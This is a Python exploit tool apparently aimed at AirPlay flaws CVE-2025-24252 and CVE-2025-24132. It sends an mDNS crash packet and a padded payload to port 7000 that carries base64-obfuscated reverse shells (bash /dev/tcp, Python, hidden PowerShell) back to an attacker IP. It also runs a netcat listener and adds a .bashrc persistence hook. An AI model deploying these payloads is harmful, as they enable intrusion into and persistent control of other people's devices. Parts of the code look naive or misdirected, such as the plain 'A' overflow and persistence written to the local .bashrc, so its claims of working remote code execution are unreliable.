#!/usr/bin/env python3
# AirBorne Elite Edition — Full RCE with Listener & Persistence
# Created by ekomsSavior | Team EVA Forever

import socket
import base64
import argparse
import subprocess
import threading
import time
import os
from scapy.all import *

def print_banner():
    print(r"""
  ___  _________________  ___________ _   _  _____  
 / _ \|_   _| ___ \ ___ \|  _  | ___ \ \ | ||  ___| 
/ /_\ \ | | | |_/ / |_/ /| | | | |_/ /  \| || |__   
|  _  | | | |    /| ___ \| | | |    /| . ` ||  __|  
| | | |_| |_| |\ \| |_/ /\ \_/ / |\ \| |\  || |___  
\_| |_/\___/\_| \_\____/  \___/\_| \_\_| \_/\____/ 

 CVE-2025-24252 & CVE-2025-24132 PoC + RCE + Persistence
    """)

# --- Payload Generators ---
def generate_payload(attacker_ip, port, method, command):
    if method == "bash":
        shell = f"bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1"
    elif method == "bash_own_command":
        shell = command
    elif method == "python":
        shell = (
            f"python3 -c 'import socket,os,pty;s=socket.socket();"
            f"s.connect((\"{attacker_ip}\",{port}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        )
    elif method == "powershell":
        shell = (
            f"powershell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',{port});"
            f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
            f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            f"$sendback = (iex $data 2>&1 | Out-String );"
            f"$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
        )
    else:
        raise ValueError("Invalid payload method.")
    
    encoded = base64.b64encode(shell.encode()).decode()
    return f"echo {encoded} | base64 -d | bash".encode()

# --- Persistence (Linux .bashrc) ---
def add_persistence(attacker_ip, port, method):
    print("[*] Adding persistence to ~/.bashrc...")
    payload = generate_payload(attacker_ip, port, method, "").decode()
    try:
        with open(os.path.expanduser("~/.bashrc"), "a") as f:
            f.write(f"\n# EVA PERSISTENCE\n{payload}\n")
        print("[+] Persistence added.")
    except Exception as e:
        print("[-] Failed to add persistence:", e)

# --- Netcat Listener (runs in background) ---
def start_listener(port):
    def listener():
        print(f"[*] Starting Netcat listener on port {port}...")
        subprocess.call(["nc", "-lvnp", str(port)])
    thread = threading.Thread(target=listener)
    thread.daemon = True
    thread.start()
    time.sleep(1)

# --- CVE-2025-24252 (mDNS crash) ---
def exploit_24252(interface):
    print("[*] Launching CVE-2025-24252 (mDNS TXT Crash)...")
    packet = IP(dst="224.0.0.251") / UDP(sport=5353, dport=5353) / DNS(
        qr=0,
        opcode=0,
        qdcount=1,
        ancount=1,
        qd=DNSQR(qname="AirPlay._tcp.local", qtype="PTR"),
        an=DNSRR(rrname="AirPlay._tcp.local", type="TXT", rdata="A" * 5000)
    )
    send(packet, iface=interface, count=1)
    print("[+] mDNS crash packet sent on interface:", interface)

# --- CVE-2025-24132 (Heap Overflow + Reverse Shell) ---
def exploit_24132(target_ip, attacker_ip, port, method, persistent, command):
    print(f"[*] Launching CVE-2025-24132 (Heap Overflow + RCE)...")
    start_listener(port)

    try:
        sock = socket.create_connection((target_ip, 7000), timeout=5)
        overflow = b"A" * 1024
        payload = generate_payload(attacker_ip, port, method, command)
        full_payload = overflow + b"\n" + payload + b"\n"
        sock.sendall(full_payload)
        sock.close()
        print("[+] Payload delivered. Check your shell.")
    except Exception as e:
        print("[-] Exploit failed:", e)

    if persistent:
        add_persistence(attacker_ip, port, method)

# --- CLI Setup ---
def main():
    print_banner()

    parser = argparse.ArgumentParser(description="AirBorne Elite PoC Exploit Tool")
    parser.add_argument("--exploit", required=True, choices=["24252", "24132"], help="Which CVE to run")
    parser.add_argument("--interface", help="Interface for CVE-24252")
    parser.add_argument("--target", help="Target IP (for CVE-24132)")
    parser.add_argument("--attacker", help="Your IP for reverse shell")
    parser.add_argument("--port", default="4444", help="Port for reverse shell")
    parser.add_argument("--payload", default="bash", choices=["bash", "bash_own_command", "python", "powershell"], help="Payload type")
    parser.add_argument("--persistent", action="store_true", help="Enable real persistence (Linux only)")
    parser.add_argument("--command", help="Custom command for bash payload (if using bash_own_command)")

    args = parser.parse_args()

    if args.exploit == "24252":
        if not args.interface:
            print("[-] Interface is required for mDNS attack.")
            return
        exploit_24252(args.interface)

    elif args.exploit == "24132":
        if not args.target or not args.attacker:
            print("[-] Target and attacker IP required.")
            return
        exploit_24132(args.target, args.attacker, int(args.port), args.payload, args.persistent, args.command)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
